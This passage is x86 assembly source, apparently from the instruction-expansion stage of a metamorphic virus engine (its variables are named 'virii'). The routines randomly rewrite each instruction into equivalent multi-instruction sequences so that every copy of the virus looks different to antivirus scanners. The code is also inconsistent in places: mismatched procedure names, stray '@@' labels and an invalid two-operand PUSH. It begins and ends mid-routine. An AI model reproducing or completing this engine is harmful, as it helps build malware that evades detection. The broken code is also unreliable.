                            jz      Double_OP_Composed          ; IF FALSE, amke a composed var.
        Double_OP_Normal:   
                            call    xpand_saveoperation         ; save the operation
                            call    xpand_gettmepvar            ; allocate a temporary variable
                            push    eax, [ebp+xpand_operate]
                            push    eax
                            mov     eax, 40h                    ; set MOV operation
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPMemImm           ; make OP Mem,Imm
                            pop     eax                         ; restore the operation
                            mov     [ebp+xpand_operate], eax
                            cmp     eax, 38h                    ; if CMP, make it direct
                            jz      Double_OP_Normal_Direct     ; (avoid the recursion)
                            cmp     eax, 48h                    ; if test, make it direct
                            jz      Double_OP_Normal_Direct     ; (avoid the recusrion)
                            call    xpand_GenOPRegMem           ; make OP Reg,Mem
                            jmp     xpand_restoreOPandDecreaseRecurseLevel
        Double_OP_Normal_Direct:
                            mov     eax, 2                      ; convert the opcode to
                            add     eax, [ebp+xpand_32bits]      ; OP Reg,Mem, set the size
                            mov     [edi], eax                  ; of the operation in the
                            call    xpand_CopyMemoryReference   ; opcode (8 or 32 bits),
                            mov     eax, [ebp+xpand_register]   ; copy the memory reference
                            mov     [edi+7], eax                ; and set the register in
                            add     edi, 10h                    ; the +7 posistion (where it
                            jmp     xpand_restoreOPandDecreaseRecurseLevel ; must be).

        Double_OP_Composed: 
                            mov     eax, [ebp+xpand_flagregORmem] ; Save the previous value
                            push    eax                           ; here
                            xor     eax, eax                      ; Set "Register usage"
                            mov     [ebp+xpand_flagregORmem], eax
                            call    xpand_MakeComposedOPImm       ; Make the composed op.
                            pop     ebx                           ; Restore the value of this
                            mov     [ebp+xpand_flagregORmem], ebx ; flag
                            or      eax, eax                      ; Check if we could make the
                            jnz     Double_OP_Normal              ; composed operation. If
                            jmp     xpand_DecreaseRecurseLevel    ; not, make it normal.

            Double_MOV:
                            call    randomboolean                 ; Decide randomly if we make a
                            or      eax, eax                      ; normal double-OP.
                            jz      Double_OP
                            mov     eax, [ebp+xpand_32bits]        ; Get it we use 32 or 64 bits
                            or      eax, eax
                            jnz     Double_OP                     ; If 8 bits, make a normal OP
                            call    xpand_GenPUSHImm              ; Generate PUSH Imm
                            call    xpand_GenPOPReg               ; Generate a POP Reg
                            jmp     xpand_DecreaseRecurseLevel
            Double_CMP:
                            call    randomboolean
                            or      eax, eax              ; Make a normal OP if we get
                            jz      Double_OP             ; TRUE randomly
                            mov     edx, 38h+4            ; Select the opcodes to use with
                            mov     ecx, 28h+4            ; CMP: CMP and SUB
                            jmp     Double_OP_CMPTEST_Common
            Double_TEST:
                            call    randomboolean
                            or      eax, eax
                            jz      Double_OP
                            mov     edx, 48h+4            ; Select the opcodes to use with
                            mov     ecx, 20h+4            ; TEST: TEST and AND
    Double_OP_CMPTEST_Common: 
                            call    xpand_saveoperation    ; Save the current operation
                            push    edx
                            push    ecx
                            call    xpand_gettmepvar       ; Allocate a temporary variable
                            mov     eax, 40h            ; Make a MOV TempVar,Reg
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPMemReg
                            pop     ecx
                            pop     edx
                            call    randomboolean       ; Select randomly the opcode 
                            or      eax, eax            ; stored in ECX or EDX
                            jz      Double_OP_CMPTEST_Next
                            mov     edx, ecx
    Double_OP_CMPTEST_Next: 
                            add     edx, [ebp+xpand_32bits]    ; Set the size of the operation
                            mov     [edi], edx             ; in the opcode and store it
                            call    xpand_CopyMemoryReference  ; blah, blah, blah...
                            mov     eax, [ebp+xpand_virii_immediate] ; Here we have done:
                            mov     [edi+7], eax            ; CMP/SUB/TEST/AND TempVar,Imm
                            add     edi, 10h
                            jmp     xpand_restoreOPandDecreaseRecurseLevel 

     Single:                mov     eax, [ebp+xpand_operate]  ; Get the operation
                            cmp     eax, 40h                 ; MOV?
                            jz      Single_MOV
                            cmp     eax, 38h                 ; CMP?
                            jz      Single_CMP
                            cmp     eax, 30h                 ; XOR?
                            jz      Single_XOR
                            or      eax, eax                 ; ADD?
                            jz      Single_ADD
                Single_OP:  mov     eax, [ebp+xpand_operate]  ; Construct the instruction
                            add     eax, [ebp+xpand_32bits]      ; with the operation, size
                            mov     [edi], eax               ; of operands, destiny reg.
                            mov     eax, [ebp+xpand_register]   ; and immediate value.
                            mov     [edi+1], eax
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel 

   ; Here we are going to make MOV Reg,Imm in a single instruction
    Single_MOV:
                            mov     eax, [ebp+xpand_virii_immediate]  ; Get the immediate value
                            or      eax, eax                 ; Is it 0?
                            jz      Single_MOV_0             ; Then, jump
   @@Single_OP_MOV:
                            call    random2                 ; Select LEA making with a
                            and     eax, 3                 ; probability of 25%
                            or      eax, eax
                            jnz     Single_OP
                            mov     eax, [ebp+xpand_32bits]    ; 8 bits operand size?
                            or      eax, eax
                            jnz     Single_OP              ; Then, we can't use LEA
                            mov     eax, 000808FCh         ; Make LEA Reg,[Imm]
                            mov     [edi], eax
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+7], eax
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+3], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel
    Single_MOV_0:                              ; Select to make LEA with 0
                            call    random2                 ; (or other) with a probability
                            and     eax, 3                 ; of 25% (or normal MOV)
                            or      eax, eax
                            jz      Single_OP_MOV
                            cmp     eax, 1                 ; Prob. of 25% of making XOR
                            jz      Single_MOV_0_XOR
                            cmp     eax, 2                 ; Prob. of 25% of making SUB
                            jz      Single_MOV_0_SUB
    Single_MOV_0_AND:                         ; Prob. of 25% of making AND
                            call    xpand_saveoperation
                            mov     eax, 20h               ; AND Reg,0
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPRegImm  
                            jmp     xpand_restoreOPandDecreaseRecurseLevel 
    Single_MOV_0_XOR:
                            add     eax, 9          ; 1, +9 = Ah, +26h = 30h: XOR
    Single_MOV_0_SUB:
                            add     eax, 26h        ; 2, +26h = 28h: SUB
                            mov     ecx, eax
                            call    xpand_saveoperation          ; Save the current operation
                            mov     [ebp+xpand_operate], ecx   ; Set the new operation
                            mov     eax, [ebp+xpand_register]    ; Set source and destiny
                            mov     [ebp+xpand_virii_srcreg], eax ;  register as the same
                            call    xpand_GenOPRegReg            ; Gen XOR/SUB Reg,Reg
                            jmp     xpand_restoreOPandDecreaseRecurseLevel

    Single_CMP:
                            mov     eax, [ebp+xpand_virii_immediate]  ; Check if the immediate is 0
                            or      eax, eax
                            jnz     Single_OP                ; If it isn't, make it normal
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jz      Single_OP        ; Prob. of 25% of making CMP Reg,0
                            cmp     eax, 1
                            jz      Single_CMP_OR    ; Prob. of 25% of making OR Reg,Reg
                            cmp     eax, 2
                            jz      Single_CMP_AND   ; Prob. of 25% of making AND Reg,Reg
    Single_CMP_TEST:                    ; Prob. of 25% of making TEST Reg,Reg
                            add     eax, 27h   ; 3, +27 = 2A, +17 = 41, +8 = 49h: TEST
    Single_CMP_AND:
                            add     eax, 17h   ; 2, +17 = 19, +8 = 21h: AND
    Single_CMP_OR:
                            add     eax, 8     ; 1, +8 = 9h: OR
                            add     eax, [ebp+xpand_32bits]
                            mov     [edi], eax              ; Set the size
                            mov     eax, [ebp+xpand_register]  ; Get the register and set it
                            mov     [edi+1], eax            ; as source and destiny
                            mov     [edi+7], eax
                            add     edi, 10h                ; Increase storage pointer
                            jmp     xpand_DecreaseRecurseLevel 

    Single_XOR:                                ; If we make XOR Reg,-1 we
                            mov     eax, [ebp+xpand_virii_immediate] ; can also make NOT Reg
                            cmp     eax, -1
                            jnz     Single_OP
                            call    randomboolean
                            or      eax, eax
                            jz      Single_OP
                            call    xpand_GenNOTReg
                            jmp     xpand_DecreaseRecurseLevel

    Single_ADD:                                ; Check the Imm
                            mov     eax, [ebp+xpand_virii_immediate]
                            cmp     eax, 1                  ; ADD Reg,1?
                            jz      Single_ADD_NOTNEG
                            cmp     eax, -1                 ; ADD Reg,-1?
                            jz      Single_ADD_NEGNOT
    Single_OP_ADD:
                            call    randomboolean           ; Select randomly TRUE/FALSE
                            or      eax, eax
                            jz      Single_OP               ; Make normal ADD if FALSE
                            mov     eax, [ebp+xpand_32bits]
                            or      eax, eax                ; If size = 8 bits, don't make
                            jnz     Single_OP               ; LEA
                            mov     eax, 0FCh               ; Make LEA Reg,[Reg+Imm]
                            mov     [edi], eax
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+1], eax
                            mov     [edi+7], eax
                            mov     eax, 8
                            mov     [edi+2], eax
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+3], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel
    Single_ADD_NOTNEG:
                            call    randomboolean           ; Select randomly if we do
                            or      eax, eax                ; NOT Reg+NEG Reg or INC Reg
                            jz      Single_ADD_INC
                            call    randomboolean
                            or      eax, eax
                            jz      Single_OP_ADD
                            call    xpand_GenNOTReg            ; Generate NOT Reg 
                            call    xpand_GenNEGReg            ; Generate NEG Reg
                            jmp     xpand_DecreaseRecurseLevel
    Single_ADD_INC:
                            xor     ebx, ebx
    Single_ADD_INCDEC_Common:
                            mov     eax, [ebp+xpand_32bits]     ; Set INC/DEC Reg. EBX is 0
                            add     eax, 4Eh                ; if we decided to do INC, or
                            mov     [edi], eax              ; 8 if we decided DEC
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+1], eax
                            mov     [edi+7], ebx            ; This opcode (4E) is only
                            add     edi, 10h                ; used here to tell the
                            jmp     xpand_DecreaseRecurseLevel ; assembler that makes INC/DEC
    Single_ADD_NEGNOT:
                            call    randomboolean
                            or      eax, eax
                            jz      Single_ADD_DEC          ; Select NEG+NOT or DEC
                            call    randomboolean
                            or      eax, eax              ; Select randomly to do NOT+NEG
                            jz      Single_OP_ADD         ; or a normal ADD operation (or
                            call    xpand_GenNEGReg          ; maybe LEA)
                            call    xpand_GenNOTReg
                            jmp     xpand_DecreaseRecurseLevel
    Single_ADD_DEC:
                            mov     ebx, 8                   ; Set DEC operation
                            jmp     Single_ADD_INCDEC_Common ; Jump to complete the instr.

xpand_GenOPRegImm  endp

;; Function to generate an OP [Mem],Reg
Xpand_GenOPMemReg  proc

                Start:      call    xpand_IncreaseRecurseLevel 
                            cmp     eax, 3       ; Single if recurs. level is too high to
                            jae     Single       ; recurse
                            call    random2
                            and     eax, 7
                            or      eax, eax
                            jnz     Single       ; Select single with a prob. of 7/8
                            call    random2
                Multiple:   mov     eax, [ebp+xpand_32bits]
                            or      eax, eax
                            jnz     Single           ; Select single if the size of the
                                                    ; operands is 8 bits
                            mov     eax, [ebp+xpand_operate]
                            cmp     eax, 40h               ; MOV?
                            jz      Multiple_MOV
    Multiple_OP:    
                            call    xpand_saveoperation        ; Make the sequence:
                            call    xpand_GenPUSHMem           ; PUSH [Mem]
                            call    xpand_gettmepvar           ; POP [TempVar]
                            call    xpand_GenPOPMem            ; OP [TempVar],Reg
                            mov     eax, [ebp+xpand_operate]   ; PUSH [TempVar]
                            cmp     eax, 38h                   ; POP [Mem]
                            jz      Multiple_OP_CMP            ; or if operation is CMP/TEST:
                            cmp     eax, 48h                   ; PUSH [Mem]
                            jz      Multiple_OP_TEST           ; POP [TempVar]
    Multiple_OP_Common:                            ; CMP/TEST [TempVar],Reg
                            call    xpand_GenOPMemReg          ; That CMP/TEST can be also
                            call    xpand_GenPUSHImm           ; SUB/AND, since we can modify
                            call    xpand_restoreoperation     ; [TempVar] as we want.
                            call    xpand_GenPOPMem
                            jmp     xpand_DecreaseRecurseLevel
    Multiple_OP_CMP:
                            mov     ecx, 3Bh
                            mov     edx, 2Bh
                            jmp     Multiple_OP_CMPTEST_Common
    Multiple_OP_TEST:
                            mov     ecx, 23h
                            mov     edx, 4Bh
    Multiple_OP_CMPTEST_Common:
                            call    randomboolean
                            or      eax, eax
                            jz      Multiple_OP_CMPTEST_Next
                            mov     edx, ecx
    Multiple_OP_CMPTEST_Next: 
                            add     edx, [ebp+xpand_32bits]
                            mov     [edi], edx
                            call    xpand_CopyMemoryReference
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     xpand_restoreOPandDecreaseRecurseLevel 
    Multiple_MOV:
    Multiple_MOV_Other:
                            call    random2         ; Should we make this specific-for-MOV
                            and     eax, 3         ; operation or do we make the normal
                            or      eax, eax       ; one?
                            jz      Multiple_OP    ; Make the normal, then
                            cmp     eax, 1
                            jz      Multiple_MOV_1  ; Select one of the two possibilities
                            cmp     eax, 2
                            jnz     Multiple_MOV_Other
    Multiple_MOV_2:
                            call    xpand_GenPUSHReg    ; Make PUSH Reg / POP [Mem]
                            call    xpand_GenPOPMem
                            jmp     xpand_DecreaseRecurseLevel
    Multiple_MOV_1: 
                            call    xpand_saveoperation       ; Make MOV [TempVar],Reg /
                            call    xpand_gettmepvar          ; / PUSH [TempVar] / POP [Mem]
                            jmp     Multiple_OP_Common

                Single:     mov     eax, [ebp+xpand_operate]
                            add     eax, [ebp+xpand_32bits]   ; Make the pseudoopcode:
                            add     eax, 3                  ; OP + 3 = OP Mem,Reg
                            mov     [edi], eax
                            call    xpand_CopyMemoryReference  ; Copy the operands
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenOPMemReg  endp


;; Generate an OP [Mem],Imm. Also check special cases.
;; When we work with a direct value (Imm), we have lots of new possiblities,
;; like the composed operations (ADD + SUB, MOV + OP, etc.).

xpand_GenOPMemImm  proc

                Start:      call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    randomboolean
                            or      eax, eax           ; Single or multiple?
                            jz      Single             ; Decide it randomly
                            call    random2
                            and     eax, 7
                            or      eax, eax   ; Probability of 1/8 of making a triplet
                            jnz     Double
                Triple:     mov     eax, [ebp+xpand_32bits]
                            or      eax, eax        ; Is size of operands 8 bits?
                            jnz     Double          ; Then, make a pair rather than this
                            call    xpand_GenPUSHMem    ; Make PUSH [Mem]
                            call    xpand_saveoperation
                            call    xpand_gettmepvar    ; Make POP [TempVar]
                            call    xpand_GenPOPMem
                            mov     eax, [ebp+xpand_operate]
                            cmp     eax, 38h                ; CMP?
                            jz      Triple_CMP
                            cmp     eax, 48h                ; TEST?
                            jz      Triple_TEST
                            call    xpand_GenOPMemImm       ; Generate OP [TempVar],Imm
                            call    xpand_GenPUSHMem        ; Generate PUSH [TempVar]
                            call    Xp_RestoreOperation
                            call    xpand_GenPOPMem         ; Generate POP [Mem]
                            jmp     xpand_DecreaseRecurseLevel
    Triple_CMP:
                            mov     ecx, 2Ch             ; ECX = SUB Mem,Imm
                            mov     edx, 3Ch             ; EDX = CMP Mem,Imm
                            jmp     Triple_CMPTEST_Common
    Triple_TEST:
                            mov     ecx, 24h             ; ECX = AND Mem,Imm
                            mov     edx, 4Ch             ; EDX = TEST Mem,Imm
    Triple_CMPTEST_Common:
                            call    randomboolean
                            or      eax, eax             ; Select randomly ECX or EDX
                            jz      Triple_CMPTEST_Next
                            mov     edx, ecx
    Triple_CMPTEST_Next:
                            add     edx, [ebp+xpand_32bits]  ; Set the size of the operands
                            mov     [edi], edx
                            call    xpand_CopyMemoryReference  ; Make the instruction
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     xpand_restoreOPandDecreaseRecurseLevel 

                Double:     mov     eax, [ebp+xpand_operate]
                            cmp     eax, 40h                 ; MOV?
                            jz      Double_MOV
                            or      eax, eax                 ; ADD?
                            jz      Double_ADD
                            cmp     eax, 38h                 ; CMP?
                            jz      Single
                            cmp     eax, 48h                 ; TEST?
                            jz      Single
                Double_OP:  mov     eax, [ebp+xpand_flagregORmem]
                            push    eax
                            mov     eax, 1                     ; Mark that we are making
                            mov     [ebp+xpand_flagregORmem], eax ; a memory operation
                            call    xpand_MakeComposedOPImm       ; Generate a composed op.
                            pop     ebx
                            mov     [ebp+xpand_flagregORmem], ebx ; Restore the flag
                            or      eax, eax                   ; If we couldn't make it,
                            jnz     Single                     ; jump and make a single.
                            jmp     xpand_DecreaseRecurseLevel
    Double_MOV:
                            call    randomboolean           ; Decide randomly if we do
                            or      eax, eax                ; this or a generic operation
                            jz      Double_OP
                            mov     eax, [ebp+xpand_32bits]     ; If size is 8 bits, we can't
                            or      eax, eax                ; make this option
                            jnz     Double_OP
                            call    xpand_GenPUSHImm           ; Generate a PUSH Imm
                            call    xpand_GenPOPMem            ; Generate a POP [Mem]
                            jmp     xpand_DecreaseRecurseLevel
    Double_ADD:
                            call    randomboolean
                            or      eax, eax
                            jz      Double_OP
                            mov     eax, [ebp+xpand_virii_immediate]
                            cmp     eax, 1                  ; ADD Mem,1?
                            jz      Double_ADD_NOTNEG       ; Then try NOT+NEG
                            cmp     eax, -1                 ; ADD Mem,-1?
                            jnz     Double_OP               ; Then try NEG+NOT
    Double_ADD_NEGNOT:
                            call    xpand_GenNEGMem            ; Generate NEG Mem
                            call    xpand_GenNOTMem            ; Generate NOT Mem
                            jmp     xpand_DecreaseRecurseLevel ; Effectively decreases Mem
    Double_ADD_NOTNEG:
                            call    xpand_GenNOTMem            ; Generate NOT Mem
                            call    xpand_GenNEGMem            ; Generate NEG Mem
                            jmp     xpand_DecreaseRecurseLevel ; Effectively increases Mem


                Single:     mov     eax, [ebp+xpand_operate] ; Get the operation
                            cmp     eax, 30h                ; XOR?
                            jz      Single_XOR
                            or      eax, eax                ; ADD?
                            jz      Single_ADD
                Single_OP:  mov     eax, [ebp+xpand_operate] ; Set OP Mem,Imm
                            add     eax, [ebp+xpand_32bits]
                            add     eax, 4
                            mov     [edi], eax
                            call    xpand_CopyMemoryReference  ; Copy the operands
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel
    Single_XOR:                                ; Check if we are making
                            mov     eax, [ebp+xpand_virii_immediate] ; XOR Mem,-1
                            cmp     eax, -1
                            jnz     Single_OP               ; If we are, we can code it
                            call    randomboolean           ; also as NOT Mem
                            or      eax, eax
                            jz      Single_OP
                            call    xpand_GenNOTMem
                            jmp     xpand_DecreaseRecurseLevel
    Single_ADD:
                            call    randomboolean           ; If we do ADD Mem,1/-1, we
                            or      eax, eax                ; can use INC Mem or DEC Mem
                            jz    @@Single_OP
                            mov     eax, [ebp+xpand_virii_immediate]
                            cmp     eax, 1
                            jz    @@Single_INC
                            cmp     eax, -1
                            jnz   @@Single_OP
    Single_DEC:
                            mov     ebx, 8                ; Set DEC if Imm == -1
    Single_INCDEC_Common:
                            mov     eax, [ebp+xpand_32bits]   ; Set the size of the operation
                            add     eax, 4Fh              ; Set the opcode (local, this
                            mov     [edi], eax            ; opcode only exists between the
                            push    ebx                   ; expander and the assembler).
                            call    xpand_CopyMemoryReference ; Copy the rest of the operands
                            pop     ebx
                            mov     [edi+7], ebx          ; Set the operation: INC or DEC
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel
        Single_INC:
                            xor     ebx, ebx              ; Set INC if Imm == 1
                            jmp     Single_INCDEC_Common

xpand_GenOPMemImm  endp

;; Generate a PUSH Reg

xpand_GenPUSHReg   proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jnz     Single           ; 1/4 to generate a complex PUSH
                Multiple:   call    xpand_saveoperation
                            call    xpand_gettmepvar    ; Allocate a temporary variable
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax ; Make a MOV [TempVar],Reg
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPMemReg
                            call    xpand_GenPUSHMem           ; Make a PUSH [TempVar]
                            jmp     xpand_restoreOPandDecreaseRecurseLevel

                Single:    mov     eax, 50h                ; Construct the PUSH Reg
xpand_GenPUSHReg_Common:
                            mov     [edi], eax
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+1], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenPUSHReg   endp

;; Generate a PUSH [Mem]

xpand_GenPUSHMem   proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 7        ; Chance of 1/8 of generating a complex
                            or      eax, eax      ; PUSH
                            jnz     Single
                            call    xpand_saveoperation
                            call    xpand_GenPUSHMem    ; Make a PUSH [Mem]
                            call    xpand_gettmepvar    ; Make a POP [TempVar]
                            call    xpand_GenPOPMem
                            call    xpand_GenPUSHMem    ; Make a PUSH [TempVar]
                            jmp     xpand_restoreOPandDecreaseRecurseLevel

                Single:    mov     eax, 51h         ; Construct the PUSH Mem directly
xpand_GenPUSHMem_Common:
                            mov     [edi], eax
                            call    xpand_CopyMemoryReference
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenPUSHMem   endp

;; Generate a POP Reg
xpand_GenPOPReg    proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jnz     Single     ; Chance of 1/4 to make it complex
                Multiple:   call    xpand_saveoperation
                            call    xpand_gettmepvar     ; Get a temporary variable
                            call    xpand_GenPOPMem      ; Make a POP [TempVar]
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPRegMem    ; Make a MOV Reg,[TempVar]
                            jmp     xpand_restoreOPandDecreaseRecurseLevel

                Single:     mov     eax, 58h            ; Make the POP Reg directly
                            jmp     xpand_GenPUSHReg_Common

Xp_GenPOPReg    endp

;; POP Mem is direct this time. If not, too many PUSH/POP Mem are generated
xpand_GenPOPMem    proc
                            call    xpand_IncreaseRecurseLevel
                Single:     mov     eax, 59h
                            jmp     xpand_GenPUSHMem_Common
xpand_GenPOPMem    endp

;; Generate a PUSH Imm
xpand_GenPUSHImm   proc
                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    randomboolean
                            or      eax, eax      ; Chance of 1/2 of making it complex
                            jz      Single
                Multiple:   call    xpand_saveoperation
                            call    xpand_gettmepvar           ; Get a temporary variable
                            mov     eax, 40h                ; Make a MOV [TempVar],Imm
                            mov     [ebp+xpand_operate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax  
                            call    xpand_GenOPMemImm
                            call    xpand_GenPUSHMem           ; Make a PUSH [TempVar]
                            jmp     xpand_restoreOPandDecreaseRecurseLevel

                Single:     mov     eax, 68h
                            mov     [edi], eax            ; Make the instruction directly
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenPUSHImm   endp


;; LEA:
;; As an instruction, LEA is only used for compressing instructions that will
;; be expanded here. If we find a LEA in the final x86 codification, it's a
;; LEA that is converted by the shrinker in MOV, ADD or any like that.
;; Using LEA in this way allow us to have a mini-embedded instruction swapper
;; 100% compatible in all cases.

xpand_GenLEA    proc

                            call    xpand_saveoperation         ; Save the operation
                            mov     eax, [ebp+xpand_virii_mem1]
                            cmp     eax, [ebp+xpand_register]   ; Index1 == destiny register?
                            jz      Addition1                ; Then, addition
                            mov     eax, [ebp+xpand_virii_mem2]
                            cmp     eax, [ebp+xpand_register]   ; Index2 == destiny register?
                            jz      Addition2                ; Then, addition
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax  ; Set MOV as first instruct.
        MOV_Other:
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jz      MOV_Other
                            cmp     eax, 1
                            jz      MOV_FirstIndex1   ; Make MOV/ADD with first index
                            cmp     eax, 2
                            jz      MOV_FirstIndex2   ; Make MOV/ADD with second index
        MOV_FirstAddition:               ; Make MOV/ADD with DWORD addition
                            mov     eax, [ebp+xpand_virii_addition]
                            or      eax, eax
                            jz      MOV_Finished2     ; It's 0? Then look if we finished
                            mov     [ebp+xpand_virii_immediate], eax
                            call    xpand_GenOPRegImm     ; Generate a MOV/ADD Reg,Imm
                            xor     eax, eax           ; Set ADD operation from now
                            mov     [ebp+xpand_virii_addition], eax
                            jmp     MOV_Finished
        MOV_FirstIndex1:
                            mov     eax, [ebp+xpand_virii_mem1] ; Get the first index
                            cmp     eax, 8                   ; If 8 (no_reg), jump to look
                            jz      MOV_Finished2            ; if we finished
                            mov     [ebp+xpand_virii_srcreg], eax ; Set the register and gen.
                            call    xpand_GenOPRegReg            ; a MOV/ADD Reg,Reg1
                            mov     eax, 8
                            mov     [ebp+xpand_virii_mem1], eax  ; Anulate the register
                            jmp     MOV_Finished
        MOV_FirstIndex2:
                            mov     eax, [ebp+xpand_virii_mem2]  ; Get the 2nd register and
                            cmp     eax, 8                    ; look if we have finished
                            jz      MOV_Finished2
                            cmp     eax, 8                 ; If it hasn't a multiplicator
                            jb      MOV_FirstIndex2_Set    ; then make the MOV/ADD
                            sub     eax, 40h               ; Subtract the multiplicator
        MOV_FirstIndex2_Set:
                            mov     [ebp+xpand_virii_srcreg], eax ; Set the source register
                            call    Xp_GenOPRegReg           ; Generate a MOV/ADD Reg,Reg2
                            mov     eax, [ebp+xpand_virii_mem2]
                            cmp     eax, 7                   ; Do it have a multiplicator?
                            jbe     MOV_FirstIndex2_Set8     ; If not, eliminate the reg.
                            sub     eax, 40h                 ; Eliminate the multiplicator
                            mov     [ebp+xpand_virii_mem2], eax ; Set the clear register
                            jmp     MOV_Finished
        MOV_FirstIndex2_Set8: 
                            mov     eax, 8                   ; Set no_reg
                            mov     [ebp+xpand_virii_mem2], eax
        MOV_Finished:
                            xor     eax, eax                 ; Set ADD as operation from
                            mov     [ebp+xpand_operate], eax  ; now
        MOV_Finished2:
                            mov     eax, [ebp+xpand_virii_mem1] ; Get the index1
                            cmp     eax, 8                   ; If it's not no_reg, then
                            jnz   @@MOV_Other                ; it's not finished
                            mov     eax, [ebp+xpand_virii_mem2] ; Get the index2
                            cmp     eax, 8                   ; no_reg?
                            jnz   @@MOV_Other                ; If not, continue
                            mov     eax, [ebp+xpand_virii_addition]
                            or      eax, eax                 ; Check if addition is 0
                            jnz   @@MOV_Other                ; If not, continue
                            call    xpand_RestoreOperation ; We finish when both indexes are
                            ret                         ; 8 and the addition is 0
                Addition1:  mov     eax, 8
                            mov     [ebp+xpand_virii_mem1], eax ; Set 8 as Index1 and put ADD
                            jmp   @@MOV_Finished             ; to make it directly
                Addition2:  mov     eax, 8
                            mov     [ebp+xpand_virii_mem2], eax ; Set 8 as Index2 and start
                            jmp   @@MOV_Finished            ; with ADD instead as with MOV

xpand_GenLEA       endp

;; Generate a NOT Reg
xpand_GenNOTReg    proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 3
                            or      eax, eax              ; Generate a complex NOT with
                            jnz     Single                ; a prob. of 1/4
                            call    xpand_GenNEGReg          ; Generate a NEG
                            call    xpand_SaveOperation
                            mov     eax, -1               ; And now generate an ADD Reg,-1
xpand_GenNOTReg_Common:
                            mov     [ebp+xpand_virii_immediate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPRegImm
                            jmp     xpand_restoreOPandDecreaseRecurseLevel

                Single:     mov     eax, [ebp+xpand_32bits]   ; Generate directly the NOT
                            or      eax, eax
                            jz      NOT32
                            mov     eax, 0E2h
                            jmp     NOT_
                    NOT32:  mov     eax, 0E0h
                    NOT_:
xpand_GenNOTReg_Common_Direct:
                            mov     [edi], eax         ; Construct the NOT/NEG instruction
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+1], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenNOTReg    endp

;; Generate a NEG Reg instruction or group of instructions that do the same

xpand_GenNEGReg    proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jnz     Single

                            call    xpand_GenNOTReg        ; Make a NOT Reg + ADD Reg,1
                            call    xpand_saveoperation
                            mov     eax, 1
                            jmp     xpand_GenNOTReg_Common

                Single:     mov     eax, [ebp+xpand_32bits]
                            or      eax, eax
                            jz      NEG32
                            mov     eax, 0E6h
                            jmp     xpand_GenNOTReg_Common_Direct
                    NEG32:  mov     eax, 0E4h
                            jmp     xpand_GenNOTReg_Common_Direct

xpand_GenNEGReg    endp


;; Generate a NOT Mem

xpand_GenNOTMem    proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jnz     Single
                                                    ; Complex:
                            call    xpand_GenNEGMem     ; Generate a NEG Mem + ADD Mem,-1
                            call    xpand_SaveOperation
                            mov     eax, -1
xpand_GenNOTMem_Common:
                            mov     [ebp+xpand_virii_immediate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPMemImm
                            jmp     xpand_restoreOPandDecreaseRecurseLevel 

            @@Single:       mov     eax, [ebp+xpand_32bits]
                            or      eax, eax
                            jz      NOT32
                            mov     eax, 0E3h
                            jmp     NOT_
                    NOT32:  mov     eax, 0E1h
                    NOT_:
Xp_GenNOTMem_Common_Direct:
                            mov     [edi], eax      ; Construct the NOT/NEG Mem instrc.
                            call    xpand_CopyMemoryReference
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel
xpand_GenNOTMem    endp

;; Generate a NEG Mem
xpand_GenNEGMem    proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
